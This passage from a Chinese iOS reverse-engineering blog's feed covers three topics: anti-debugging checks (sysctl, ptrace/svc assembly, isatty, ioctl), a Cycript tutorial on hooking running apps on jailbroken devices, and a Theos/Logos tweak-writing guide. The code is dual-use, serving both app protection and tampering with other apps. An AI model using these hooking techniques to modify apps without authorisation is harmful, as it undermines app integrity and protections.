KERN_PROC_PID;//进程ID<br><br>    name[3] = getpid();//获取pid<br><br>    int proc_err = sysctl(name, 4, &amp;info, &amp;info_size, NULL, 0);<br><br>    if (proc_err == -1) &#123; //判断是否出现了异常<br><br>        exit(-1);<br><br>    &#125;<br><br>    //info.kp_proc.p_flag中存放的是标志位（二进制），在proc.h文件中有p_flag的宏定义，通过&amp;运算可知对应标志位的值是否为0。（若结果值为0则对应标志位为0）。其中P_TRACED为正在跟踪调试过程。<br><br>    return ((info.kp_proc.p_flag &amp; P_TRACED) != 0);<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="syscall反调"><a href="#syscall反调" class="headerlink" title="syscall反调"></a>syscall反调</h2><p>直接调用这个函数:</p><p>其中PT_DENT_ATTACH的值为31，直接填31即可。SYS_ptrace的值为26，可以引入&lt;sys/syscall.h&gt;头文件后直接调用宏定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">#import &lt;sys/syscall.h&gt;<br><br>syscall(SYS_ptrace,PT_DENT_ATTACH,0,0,0);<br></code></pre></td></tr></table></figure><p>为从实现从用户态切换到内核态，系统提供了一个系统调用函数syscall，上面讲到的ptrace也是通过系统调用去实现的。而ptrace的编号为26，也就是SYS_ptrace的值:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">26</span>. ptrace               <span class="hljs-number">801</span>e<span class="hljs-number">812</span>c T<br></code></pre></td></tr></table></figure><p>其他函数编号可以在这里Kernel Syscalls查阅</p><p>但是syscall在iOS10之后废弃了。代替它的函数在</p><p>&lt;sys/kdebug_signpost.h&gt;里，叫kdebug_signpost()</p><h2 id="SIGSTOP-当检测到有断点触发时停止调试"><a href="#SIGSTOP-当检测到有断点触发时停止调试" class="headerlink" title="SIGSTOP(当检测到有断点触发时停止调试))"></a>SIGSTOP(当检测到有断点触发时停止调试))</h2><p>通过捕获系统SIGSTOP信号来判断。</p><p>如果程序没有断点。那这个是没有用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">dispatch_source_t source = dispatch_source_create(DISPATCH_SOURCE_TYPE_SIGNAL, SIGSTOP, 0, dispatch_get_main_queue());<br><br>    dispatch_source_set_event_handler(source, ^&#123;<br><br>        exit(0);<br><br>    &#125;);<br><br>    dispatch_resume(source);<br>isatty<br><br>isatty方法也可以用来检测是否正在被调试<br><br>#import &lt;unistd.h&gt;<br><br>if (isatty(1)) &#123;<br><br>   exit(0);   <br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="isatty"><a href="#isatty" class="headerlink" title="isatty"></a>isatty</h2><p>isatty方法也可以用来检测是否正在被调试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#import &lt;unistd.h&gt;</span><br><span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">1</span>)) &#123;<br>   <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);   <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">#import &lt;sys/ioctl.h&gt;<br>void Anti_ioctl() &#123;<br>    if (!ioctl(1, TIOCGWINSZ)) &#123;<br>        exit(1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是，上述这些方式只能简单地防止 App 被动态调试，其实 ptrace、sysctl、syscall 等函数本身也可以被静态修改或 Hook。而且即便能有效阻止了调试，App 仍然可以通过 tweak 去 Hook App 内部的方法实现，也可以通过 dylib 注入去修改 App 的功能</p><p>我们只好从多方面考虑，尽可能提高安全性，比如防止 tweak 依附、防止网络请求抓包、对敏感数据进行加解密、代码混淆、检查二进制 binary 签名是否匹配；关键逻辑用更底层的 C 函数实现（虽然 C 函数也是可以被 Hook，例如 Facebook 开源的 fishhook），等等，同时我们也可以检查手机是否已经越狱，并对越狱机做特殊处理。</p><h2 id="内联-svc-ptrace-实现和内联-svc-syscall-ptrace-实现"><a href="#内联-svc-ptrace-实现和内联-svc-syscall-ptrace-实现" class="headerlink" title="内联 svc + ptrace 实现和内联 svc + syscall + ptrace 实现"></a>内联 svc + ptrace 实现和内联 svc + syscall + ptrace 实现</h2><p> 其实这两种方法都等同于直接或间接使用 ptrace, 此时系统调用号是 SYS_ptrace</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs objective-c"> static __attribute__((always_inline)) void AntiDebugASM() &#123;<br><br>#ifdef __arm__<br><br>    asm volatile(<br><br>                 &quot;mov r0,#31\n&quot;<br><br>                 &quot;mov r1,#0\n&quot;<br><br>                 &quot;mov r2,#0\n&quot;<br><br>                 &quot;mov r12,#26\n&quot;<br><br>                 &quot;svc #80\n&quot;<br><br>                 );<br><br>#endif<br><br>#ifdef __arm64__<br><br>    asm volatile(<br><br>                 &quot;mov x0,#26\n&quot;<br><br>                 &quot;mov x1,#31\n&quot;<br><br>                 &quot;mov x2,#0\n&quot;<br><br>                 &quot;mov x3,#0\n&quot;<br><br>                 &quot;mov x16,#0\n&quot;<br><br>                 &quot;svc #128\n&quot;<br><br>                 );<br><br>#endif<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内联汇编调用exit函数"><a href="#内联汇编调用exit函数" class="headerlink" title="内联汇编调用exit函数"></a>内联汇编调用exit函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">static __attribute__((always_inline)) void OPENME() &#123;<br>    asm volatile(<br>                 &quot;mov x0,#0\n&quot;<br>                 &quot;mov x16,#1\n&quot;<br>                 &quot;svc #80\n&quot;<br>                 &quot;mov x1, #0\n&quot;<br>                 &quot;mov sp, x1\n&quot;<br>                 &quot;mov x29, x1\n&quot;<br>                 &quot;mov x30, x1\n&quot;<br>                 &quot;ret&quot;<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p>对于fishhook交换系统函数的绕过方式，我们可以通过将sysctl等函数调用放到动态库中，以保证检测函数可以在进攻注入的代码之前执行。动态库的加载顺序为Build Phases下的Link Binary With Libaraies中的排列顺序。</p><h2 id="svc-syscall-ptrace-反反调试"><a href="#svc-syscall-ptrace-反反调试" class="headerlink" title="svc + syscall + ptrace 反反调试"></a>svc + syscall + ptrace 反反调试</h2> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/youshaoduo/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">83688732</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iOS</tag>
      
      <tag>反调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之cycript</title>
    <link href="/2021/08/22/iOS-cycript/"/>
    <url>/2021/08/22/iOS-cycript/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cycript是由Cydia创始人Saurik推出的一款脚本语言，Cycript混合了OC、JavaScript语法的解释器，我们能够在一个命令中使用Oc或者JavaScript，甚至两者并用。它能够挂钩正在运行的进程，能够在运行时修改很多东西。</p><p><a href="http://www.cycript.org/manual/#97846f1e-fda4-43bc-8432-45bb1115c433">官方参考手册</a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>1.越狱手机安装Cycript插件，ssh登录到手机中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">cycript -<span class="hljs-selector-tag">p</span> pid<br></code></pre></td></tr></table></figure><p>2.使用MonkeyDev新建MonkeyApp工程，运行需要动态调试的App,Monkey默认开启了Cycript服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">CHConstructor&#123;<br>    NSLog(INSERT_SUCCESS_WELCOME);<br>    <br>    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification * _Nonnull note) &#123;<br>        <br>#ifndef __OPTIMIZE__<br>        CYListenServer(6666);<br><br>        MDCycriptManager* manager = [MDCycriptManager sharedInstance];<br>        [manager loadCycript:NO];<br><br>        NSError* error;<br>        NSString* result = [manager evaluateCycript:@&quot;UIApp&quot; error:&amp;error];<br>        NSLog(@&quot;result: %@&quot;, result);<br>        if(error.code != 0)&#123;<br>            NSLog(@&quot;error: %@&quot;, error.localizedDescription);<br>        &#125;<br>#endif<br>        <br>    &#125;];<br>&#125;<br></code></pre></td></tr></table></figure><p>我们只需要Cycript链接到目标应用：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cycript</span> -r IP:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li>UIApp</li><li>NSHomeDirectory()</li><li>[[NSBundle mainBundle] bundleIdentifier]</li><li>UIApp.delegate</li><li>UIApp.keyWindow</li><li>UIApp.keyWindow.recursiveDescription().toString()</li><li>UIApp.keyWindow.rootViewController </li><li>#address :获取该对象</li><li>*#address:打印该对象成员变量</li><li>?exit</li></ul><h3 id="弹窗"><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">alert = [[<span class="hljs-built_in">UIAlertView</span> alloc]initWithTitle:<span class="hljs-string">&quot;@@&quot;</span> message:<span class="hljs-string">&quot;hahaha&quot;</span> delegate:<span class="hljs-literal">nil</span> cancelButtonTitle:<span class="hljs-string">&quot;OK&quot;</span> otherButtonTitles:<span class="hljs-literal">nil</span>]<br></code></pre></td></tr></table></figure><p>调用</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">[alert <span class="hljs-keyword">show</span>]<br>[#<span class="hljs-number">0x1046bcbc0</span> <span class="hljs-keyword">show</span>]<br>alert.<span class="hljs-keyword">show</span>()<br></code></pre></td></tr></table></figure><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol><li><p>将手机语言设置未英文（方便定位），进入设置-关于</p></li><li><p>打印当前页面的所有信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">UIApp.keyWindow.recursiveDescription().toString()<br><br><span class="hljs-comment">//只显示一部分</span><br> &lt;PSTableCell: <span class="hljs-number">0x10392e000</span>; baseClass = UITableViewCell; frame = (<span class="hljs-number">0</span> <span class="hljs-number">290</span>; <span class="hljs-number">375</span> <span class="hljs-number">44</span>); text = <span class="hljs-string">&#x27;Network&#x27;</span>; autoresize = W; tag = <span class="hljs-number">4</span>; layer = &lt;CALayer: <span class="hljs-number">0x2811e46a0</span>&gt;&gt;\n<br></code></pre></td></tr></table></figure><p>可以看见Network的PSTableCell以及对象地址</p></li><li><p>隐藏/显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//隐藏</span><br>[#<span class="hljs-number">0x10392e000</span> setHidden:YES]<br><span class="hljs-comment">//显示</span><br>[#<span class="hljs-number">0x10392e000</span> setHidden:NO]<br></code></pre></td></tr></table></figure></li><li><p>通过nextResponder找到cell对应的controller</p><p>通过三次nextResponder最终找到了controller-&gt;PSGAboutController</p> <img src="/2021/08/22/iOS-cycript/images/%E4%BF%AE%E6%94%B9controller.png" class=""></li><li><p>修改controller的标题</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">[#<span class="hljs-number">0x104137400</span> setTitle:<span class="hljs-string">&quot;Cola&quot;</span>]<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>iOS</tag>
      
      <tag>cycript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之Tweak</title>
    <link href="/2021/08/22/iOS-Tweak/"/>
    <url>/2021/08/22/iOS-Tweak/</url>
    
    <content type="html"><![CDATA[<h2 id="编写HOOK插件"><a href="#编写HOOK插件" class="headerlink" title="编写HOOK插件"></a>编写HOOK插件</h2><h3 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">1</span>. 终端输入<span class="hljs-selector-tag">nic</span><span class="hljs-selector-class">.pl</span><br><span class="hljs-selector-tag">2</span>. <span class="hljs-selector-tag">Choose</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">Template</span> (required): <span class="hljs-selector-tag">10</span><br><span class="hljs-selector-tag">3</span>. <span class="hljs-selector-tag">Project</span> <span class="hljs-selector-tag">Name</span> (required): 工程名<br><span class="hljs-selector-tag">4</span>. <span class="hljs-selector-tag">Package</span> <span class="hljs-selector-tag">Name</span> <span class="hljs-selector-attr">[com.yourcompany.tututest]</span>:  包名:<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><br><span class="hljs-selector-tag">5</span>. <span class="hljs-selector-tag">Author</span>/<span class="hljs-selector-tag">Maintainer</span> <span class="hljs-selector-tag">Name</span> <span class="hljs-selector-attr">[lk]</span>: 作者<br><span class="hljs-selector-tag">6</span>. <span class="hljs-selector-attr">[iphone/tweak]</span> <span class="hljs-selector-tag">MobileSubstrate</span> <span class="hljs-selector-tag">Bundle</span> <span class="hljs-selector-tag">filter</span> <span class="hljs-selector-attr">[com.apple.springboard]</span>: 要<span class="hljs-selector-tag">Hook</span>的包名<br><span class="hljs-selector-tag">7</span>. <span class="hljs-selector-attr">[iphone/tweak]</span> <span class="hljs-selector-tag">List</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">applications</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">terminate</span> <span class="hljs-selector-tag">upon</span> <span class="hljs-selector-tag">installation</span> (space-separated, <span class="hljs-string">&#x27;-&#x27;</span> for none) <span class="hljs-selector-attr">[SpringBoard]</span>: 回车默认<br><br></code></pre></td></tr></table></figure><h3 id="工程文件简介"><a href="#工程文件简介" class="headerlink" title="工程文件简介"></a>工程文件简介</h3><p>创建好的工程下共有4个文件</p> <img src="/2021/08/22/iOS-Tweak/images/tweakproject.png" class=""><ul><li><p>Makefile   编译文件</p></li><li><p>Tweak.x    编写HOOK文件</p></li><li><p>control     插件作者、版本信息</p></li><li><p>demo001.plist  设置要HOOK的Bundle ID</p></li></ul><h4 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h4><p>指定工程用到的文件,框架,库等信息,将整个过程自动化</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">INSTALL_TARGET_PROCESSES = SpringBoard<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(THEOS)</span>/makefiles/common.mk<br><br>TWEAK_NAME = demo001<br><br>demo001_FILES = Tweak.x<br>demo001_CFLAGS = -fobjc-arc<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(THEOS_MAKE_PATH)</span>/tweak.mk<br></code></pre></td></tr></table></figure><ol><li>INSTALL_TARGET_PROCESSES = SpringBoard 目标安装的项目</li><li>include $(THEOS)/makefiles/common.mk 固定写法 </li><li>TWEAK_NAME = demo001 tweak的名称</li><li>demo001_FILES = Tweak.x tweak源文件,多个文件以空格分隔</li><li>include $(THEOS_MAKE_PATH)/tweak.mk 通过include命令指定不同的.mk文件</li></ol><p>除了上面的信息格式,我们还可以添加以下信息</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">我们如何通过进行指定SDK?<br>TARGET = iPhone:latest:8.0 <br><br>我们如何导入framework?<br>demo001_FRAMWORKS = UIKit  <br><br>我们如何指定处理器架构<br>ARCHS = armv7 arm64  <br><br>我么如何链接Mach-O对象<br>demo001_LDFLAGS = -lx<br>注意<br>-lx 代表链接libx.a或libx.dylib,即给x加上lib的前缀,以及.a或.dylib的后缀,可以根据自己的项目进行调整<br><br></code></pre></td></tr></table></figure><h4 id="Tweak-x"><a href="#Tweak-x" class="headerlink" title="Tweak.x"></a>Tweak.x</h4><p>xm 中的x代表这个文件支持Logos语法</p><p>x 如果后缀名是单独的x,说明源文件支持Logos和C语法;</p><p>xm 如果后缀名是xm,说明源文件支持Logos和C/C++语法.</p><p>.xi 将首先作为objective-c进行预处理，然后Logos将处理结果，然后将进行编译。</p><p>.xmi 将首先作为objective-c ++进行预处理，然后Logos将处理结果，然后将进行编译。</p><h4 id="demo001-plist"><a href="#demo001-plist" class="headerlink" title="demo001.plist"></a>demo001.plist</h4><p>用于指定需要注入的目标文件的Bundle ID</p><h4 id="control"><a href="#control" class="headerlink" title="control"></a>control</h4><p>指定deb包的一些信息,包括名字,描述,版本号等</p><h3 id="编写HOOK代码"><a href="#编写HOOK代码" class="headerlink" title="编写HOOK代码"></a>编写HOOK代码</h3><p>编辑tweak.x</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-comment">//hook ViewController的test方法</span><br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> ViewController<br><br>-<span class="ruby"> (void)test&#123;</span><br><span class="ruby"></span><br>    NSLog(@&quot;🍺🍺🍺HOOK🍺🍺🍺&quot;);<br>&#125;<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><p>设置环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> THEOS_DEVICE_IP = localhost<br><span class="hljs-builtin-name">export</span> THEOS_DEVICE_PORT = 2222<br></code></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>使用iproxy转发手机22端口到本地2222</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iproxy</span> <span class="hljs-number">2222</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>终端输入 make；make package install</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span><br><span class="hljs-built_in">make</span> <span class="hljs-keyword">package</span> install<br></code></pre></td></tr></table></figure><h2 id="Logos语法"><a href="#Logos语法" class="headerlink" title="Logos语法"></a>Logos语法</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>phonedevwiki.net<span class="hljs-regexp">/index.php/</span>Logos<br></code></pre></td></tr></table></figure><table><thead><tr><th>Logos语法</th><th>功能解释</th><th>事例</th></tr></thead><tbody><tr><td>%hook</td><td>需要hook哪个类</td><td>%hook Classname</td></tr><tr><td>%end</td><td>代码块结束标记</td><td>%end</td></tr><tr><td>%group</td><td>分组</td><td>%group Groupname</td></tr><tr><td>%new</td><td>添加新方法</td><td>%new(signature)</td></tr><tr><td>%ctor</td><td>构造函数</td><td>%ctor { … }</td></tr><tr><td>%dtor</td><td>析构函数</td><td>%dtor { … }</td></tr><tr><td>%log</td><td>输出打印</td><td>%log; %log([(), …]);</td></tr><tr><td>%orig</td><td>保持原有方法</td><td>%orig；%orig(arg1, …)；</td></tr><tr><td>%c</td><td>动态获取类</td><td>%c([+/-]Class)；</td></tr></tbody></table><h3 id="1-hook-end"><a href="#1-hook-end" class="headerlink" title="1. %hook %end"></a>1. %hook %end</h3><p>指定需要hook的class,必须以％end结尾。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-comment">// hook SpringBoard类里面的_menuButtonDown函数,先打印一句话,再之子那个函数原始的操作</span><br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBorad<br>-<span class="ruby"> (void)<span class="hljs-symbol">_menuButtonDown:</span>(id)down</span><br><span class="ruby"></span>&#123;<br>    NSLog(@&quot;111111&quot;);<br><span class="hljs-tag">   %<span class="hljs-selector-tag">orig</span></span>; // 调用原始的_menuButtonDown函数<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="2-group"><a href="#2-group" class="headerlink" title="2.%group"></a>2.%group</h3><p>该指令用于将%hook分组，便于代码管理及按条件初始化分组，必须以%end结尾。 </p><p>一个％group可以包含多个%hook,所有不属于某个自定义group的％hook会被隐式归类到％group_ungrouped中。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">group</span></span> iOS8<br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> IOS8_SPECIFIC_CLASS<br><span class="hljs-comment">    // your code here</span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end hook<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end group ios8<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">group</span></span> iOS9<br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> IOS9_SPECIFIC_CLASS<br><span class="hljs-comment">    // your code here</span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end hook<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end group ios9<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">ctor</span></span> &#123;<br>    if (kCFCoreFoundationVersionNumber &gt; 1200) &#123;<br><span class="hljs-tag">        %<span class="hljs-selector-tag">init</span>(iOS9)</span>;<br>    &#125; else &#123;<br><span class="hljs-tag">        %<span class="hljs-selector-tag">init</span>(iOS8)</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-new"><a href="#3-new" class="headerlink" title="3.%new"></a>3.%new</h3><p>在%hook内部使用，给一个现有class添加新函数，功能与class_addMethod相同. </p><p>注：<br>Objective-C的category与class_addMethod的区别： </p><p>前者是静态的而后者是动态的。使用%new添加,而不需要向.h文件中添加函数声明,如果使用category,可能与遇到这样那样的错误.</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBoard<br><span class="hljs-tag">%<span class="hljs-selector-tag">new</span></span><br>-<span class="ruby"> (void)addNewMethod</span><br><span class="ruby"></span>&#123;<br>    NSLog(@&quot;动态添加一个方法到SpringBoard&quot;);<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="4-ctor"><a href="#4-ctor" class="headerlink" title="4.%ctor"></a>4.%ctor</h3><p>tweak的constructor,完成初始化工作；如果不显示定义，Theos会自动生成一个%ctor,并在其中调用%init(_ungrouped)。</p><p>%ctor一般可以用来初始化%group,以及进行MSHookFunction等操作,如下:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#ifndef KCFCoreFoundationVersionNumber_iOS_8_0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KCFCoreFoundationVersionNumber_iOS_8_0      1140.10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>%ctor<br>&#123;<br>    %<span class="hljs-keyword">init</span>;<br><br>    <span class="hljs-keyword">if</span> (KCFCoreFoundationVersionNumber &gt;= KCFCoreFoundationVersionNumber_iOS_7_0 &amp;&amp; KCFCoreFoundationVersionNumber &gt; KCFCoreFoundationVersionNumber_iOS_8_0)<br>    %<span class="hljs-keyword">init</span>(iOS7Hook);<br> <span class="hljs-keyword">if</span> (KCFCoreFoundationVersionNumber &gt;= KCFCoreFoundationVersionNumber_iOS_8_0)<br>    %<span class="hljs-keyword">init</span>(iOS8Hook);<br>MSHookFunction((<span class="hljs-keyword">void</span> *)&amp;AudioServicesPlaySystemSound,(<span class="hljs-keyword">void</span> *)&amp;replaced_AudioServerPlaySystemSound,(<span 